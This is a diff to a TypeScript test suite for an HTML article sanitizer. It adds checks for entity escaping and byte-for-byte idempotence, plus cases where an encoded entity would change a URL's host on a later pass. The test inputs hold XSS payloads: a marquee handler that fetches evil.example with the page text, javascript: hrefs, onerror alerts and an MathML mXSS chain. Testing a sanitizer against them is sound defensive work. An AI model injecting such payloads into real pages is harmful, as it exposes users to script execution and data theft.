@@ -22,18 +22,54 @@ interface SeenElement {
   attrs: [string, string][];
 }
 
-// Every element and attribute a browser's tokenizer finds in `html`.
-async function oracle(html: string): Promise<SeenElement[]> {
-  const seen: SeenElement[] = [];
+interface Seen {
+  elements: SeenElement[];
+  // Each text chunk as it is written in the source, entities and all.
+  text: string[];
+}
+
+// Every element, attribute and text run a browser's tokenizer finds in `html`.
+// lol-html reports source text, not decoded values: `title="a&amp;b"` comes
+// back as the six characters `a&amp;b`. That is the more useful view here —
+// decodeAttr below turns it into what the renderer will see, and ESCAPED_ONLY
+// checks the source form directly — but it means no assertion may read one for
+// the other.
+async function oracle(html: string): Promise<Seen> {
+  const elements: SeenElement[] = [];
+  const text: string[] = [];
   await new HTMLRewriter()
     .on("*", {
       element(el) {
-        seen.push({ tag: el.tagName, attrs: [...el.attributes] });
+        elements.push({ tag: el.tagName, attrs: [...el.attributes] });
+      },
+    })
+    // Document-level, so a text run that is not inside any element counts too:
+    // the sanitizer unwraps an off-list element and its text lands at the top.
+    .onDocument({
+      text(t) {
+        if (t.text !== "") text.push(t.text);
       },
     })
     .transform(new Response(html))
     .text();
-  return seen;
+  return { elements, text };
+}
+
+// The four escapes the sanitizer writes, and nothing else. If this holds, the
+// output's source text and its decoded value differ by exactly those four, so
+// decodeAttr is the whole decoder and a second parse cannot read a different
+// URL out of the same record.
+const ESCAPED_ONLY = /&(?!(?:amp|quot|lt|gt);)/;
+
+// What the renderer decodes an attribute value back into. The inverse of the
+// sanitizer's escapeAttr, "&amp;" last so `&amp;lt;` comes back as the text
+// "&lt;" rather than as "<". Only sound because ESCAPED_ONLY holds.
+function decodeAttr(value: string): string {
+  return value
+    .replace(/&quot;/g, '"')
+    .replace(/&lt;/g, "<")
+    .replace(/&gt;/g, ">")
+    .replace(/&amp;/g, "&");
 }
 
 // The policy, written out a second time so the test states it rather than
@@ -64,15 +100,21 @@ const SAFE_DATA_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif|bmp|x-icon)[;,]
 // names the payload that produced them.
 async function violations(out: string): Promise<string[]> {
   const bad: string[] = [];
-  for (const el of await oracle(out)) {
+  const seen = await oracle(out);
+  for (const el of seen.elements) {
     if (!ALLOWED_TAGS.has(el.tag)) bad.push(`element <${el.tag}>`);
     const allowed = ALLOWED_ATTRS[el.tag] ?? [];
-    for (const [name, value] of el.attrs) {
+    for (const [name, raw] of el.attrs) {
       if (name.startsWith("on")) bad.push(`handler ${el.tag}[${name}]`);
       if (!allowed.includes(name)) {
         bad.push(`attribute ${el.tag}[${name}]`);
         continue;
       }
+      // An entity the sanitizer did not write is a value that means one thing
+      // in this string and another after the next parse, which is how
+      // `https://&#101;vil.example/a.jpg` changed hosts between passes.
+      if (ESCAPED_ONLY.test(raw)) bad.push(`unescaped & in ${el.tag}[${name}]=${raw}`);
+      const value = decodeAttr(raw);
       if (name === "href" || name === "src") {
         const url = value.replace(/[\u0000-\u001f\u007f]/g, "");
         const ok = /^https?:\/\//i.test(url) || (el.tag === "img" && SAFE_DATA_IMAGE.test(url));
@@ -83,23 +125,41 @@ async function violations(out: string): Promise<string[]> {
       }
     }
   }
+  // Text is escaped by a different function than attributes are; the property
+  // is the same one and it is checked rather than assumed.
+  for (const chunk of seen.text) {
+    if (ESCAPED_ONLY.test(chunk)) bad.push(`unescaped & in text ${JSON.stringify(chunk)}`);
+  }
   return bad;
 }
 
 async function expectSafe(source: string): Promise<string> {
   const out = sanitizeArticleHtml(source);
   expect(await violations(out)).toEqual([]);
-  // Sanitizing again must not resurrect anything either: the article view and
-  // the saved-article read path both run this over bodies that already went
-  // through it.
-  expect(await violations(sanitizeArticleHtml(out))).toEqual([]);
+  // Byte for byte, not safe-again. The article view and the saved-article read
+  // path both run this over bodies that already went through it, so a body that
+  // sanitizes to something else on the second pass is a record that renders
+  // differently depending on how many reads it has had. Judging the second pass
+  // by the oracle only asks whether the drift was dangerous.
+  expect(sanitizeArticleHtml(out)).toBe(out);
   return out;
 }
 
-// The attributes the oracle finds on the first element of that name.
+// The attributes the oracle finds on the first element of that name, decoded:
+// these assertions are about the URL the renderer resolves, not the escaping,
+// which violations() covers.
 async function attrsOf(out: string, tag: string): Promise<Record<string, string>> {
-  const el = (await oracle(out)).find((e) => e.tag === tag);
-  return el ? Object.fromEntries(el.attrs) : {};
+  const el = seenFirst(await oracle(out), tag);
+  return el ? Object.fromEntries(el.attrs.map(([n, v]) => [n, decodeAttr(v)])) : {};
+}
+
+function seenFirst(seen: Seen, tag: string): SeenElement | undefined {
+  return seen.elements.find((e) => e.tag === tag);
+}
+
+// The elements alone, for the tests that assert the whole output is text.
+async function elementsOf(html: string): Promise<SeenElement[]> {
+  return (await oracle(html)).elements;
 }
 
 // --- the two demonstrated bypasses ------------------------------------------
@@ -111,7 +171,7 @@ test("a > inside a quoted attribute value does not end the tag", async () => {
   const out = await expectSafe(
     `<marquee title="a>" onstart="fetch('https://evil.example/'+document.body.innerText)">x</marquee>`,
   );
-  expect(await oracle(out)).toEqual([]);
+  expect(await elementsOf(out)).toEqual([]);
   expect(out).toBe("x");
 });
 
@@ -181,13 +241,14 @@ test("a javascript: href is dropped however it is spelled", async () => {
 
 test("a quote or a newline inside an http URL cannot end the attribute", async () => {
   const quoted = await expectSafe(`<a href='https://x/a"onmouseover=alert(1)'>x</a>`);
-  // The oracle reports an attribute value as it is written, entities and all;
-  // the quote is escaped, so it stays inside the value instead of ending it.
+  // The quote stays inside the value instead of ending it: one href, the whole
+  // string, and no second attribute for the tokenizer to find.
   expect(await attrsOf(quoted, "a")).toEqual({
-    href: "https://x/a&quot;onmouseover=alert(1)",
+    href: 'https://x/a"onmouseover=alert(1)',
     target: "_blank",
     rel: "noreferrer noopener",
   });
+  expect(quoted).toContain('href="https://x/a&quot;onmouseover=alert(1)"');
   // Tab, CR and LF are stripped from a URL by the renderer, so they are stripped
   // before the scheme test and the value written out is the one that was tested.
   const split = await expectSafe(`<img src="https://x/\ta\n.jpg">`);
@@ -225,7 +286,7 @@ test("svg goes with everything inside it", async () => {
     `<svg><desc><![CDATA[<img src=x onerror=alert(1)>]]></desc></svg>`,
   ]) {
     const out = await expectSafe(html);
-    expect(await oracle(out)).toEqual([]);
+    expect(await elementsOf(out)).toEqual([]);
   }
 });
 
@@ -238,7 +299,7 @@ test("MathML and the mtext/mglyph mXSS chain go too", async () => {
   const out = await expectSafe(
     `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math><p>after</p>`,
   );
-  expect(await oracle(out)).toEqual([{ tag: "p", attrs: [] }]);
+  expect(await elementsOf(out)).toEqual([{ tag: "p", attrs: [] }]);
 });
 
 test("raw-text and form elements take their payload with them", async () => {
@@ -253,7 +314,7 @@ test("raw-text and form elements take their payload with them", async () => {
     `<base href="javascript:"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
   ]) {
     const out = await expectSafe(html);
-    expect(await oracle(out)).toEqual([]);
+    expect(await elementsOf(out)).toEqual([]);
   }
 });
 
@@ -282,14 +343,36 @@ test("malformed, unclosed and doubled-up tags stay harmless", async () => {
 
 test("an escaped payload stays text, at one level of encoding or two", async () => {
   const once = await expectSafe(`<p>&lt;img src=x onerror=alert(1)&gt;</p>`);
-  expect(await oracle(once)).toEqual([{ tag: "p", attrs: [] }]);
+  expect(await elementsOf(once)).toEqual([{ tag: "p", attrs: [] }]);
   const twice = await expectSafe(`<p>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</p>`);
-  expect(await oracle(twice)).toEqual([{ tag: "p", attrs: [] }]);
+  expect(await elementsOf(twice)).toEqual([{ tag: "p", attrs: [] }]);
   // Decoded once by the parser, written back escaped, so re-parsing gives the
   // same text rather than a tag.
   expect(twice).toBe("<p>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</p>");
   const quoted = await expectSafe(`<div title="&quot;><img src=x onerror=alert(1)>">t</div>`);
-  expect(await oracle(quoted)).toEqual([{ tag: "div", attrs: [] }]);
+  expect(await elementsOf(quoted)).toEqual([{ tag: "div", attrs: [] }]);
+});
+
+// An entity in the middle of a URL is the same one-level-of-encoding question,
+// asked where it decides a host rather than a tag. The parser hands over the
+// decoded value, so what is written back has to be escaped or the next pass
+// decodes it a second time — and the next pass always comes: sanitizing runs on
+// every read of a stored body, not once on the way in.
+test("an entity inside a URL cannot decode into a different URL on a later pass", async () => {
+  const img = await expectSafe(`<img src="https://&amp;#101;vil.example/a.jpg">`);
+  expect(await attrsOf(img, "img")).toEqual({
+    src: "https://&#101;vil.example/a.jpg",
+    loading: "lazy",
+  });
+  const link = await expectSafe(`<a href="https://&amp;#101;vil.example/x">t</a>`);
+  expect((await attrsOf(link, "a")).href).toBe("https://&#101;vil.example/x");
+  // The same host on the third pass as on the first, which is the property the
+  // renderer depends on: expectSafe pins pass two, this pins that it converges.
+  expect(sanitizeArticleHtml(sanitizeArticleHtml(img))).toBe(img);
+  // And a query string keeps its separators as separators rather than losing an
+  // "&amp;" a pass.
+  const query = await expectSafe(`<img src="https://cdn.x/a.jpg?w=1&amp;amp;h=2">`);
+  expect((await attrsOf(query, "img")).src).toBe("https://cdn.x/a.jpg?w=1&amp;h=2");
 });
 
 // --- images -----------------------------------------------------------------
@@ -480,6 +563,10 @@ test("nothing in the payload corpus survives", async () => {
     `<div><a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)">x</a></div>`,
     `<a href="https://x/a?b=1&amp;c=2">x</a>`,
     `<p>text with & an ampersand < and a bracket</p>`,
+    `<img src="https://&amp;#101;vil.example/a.jpg">`,
+    `<a href="https://ok.example/&amp;#x2f;&amp;#x2f;evil.example/">x</a>`,
+    `<img src="https://cdn.x/a.jpg?w=1&amp;amp;h=2">`,
+    `<td colspan="&amp;#50;">x</td>`,
   ];
   for (const html of corpus) await expectSafe(html);
 });
@@ -543,8 +630,12 @@ test("2000 seeded random payloads produce nothing off the allowlist", async () =
     const out = sanitizeArticleHtml(html);
     const bad = await violations(out);
     if (bad.length > 0) throw new Error(`${JSON.stringify(html)} -> ${JSON.stringify(out)}: ${bad.join(", ")}`);
-    const again = await violations(sanitizeArticleHtml(out));
-    if (again.length > 0) throw new Error(`re-sanitizing ${JSON.stringify(out)}: ${again.join(", ")}`);
+    const again = sanitizeArticleHtml(out);
+    if (again !== out) {
+      throw new Error(
+        `not idempotent: ${JSON.stringify(html)} -> ${JSON.stringify(out)} -> ${JSON.stringify(again)}`,
+      );
+    }
   }
   expect(true).toBe(true);
 });
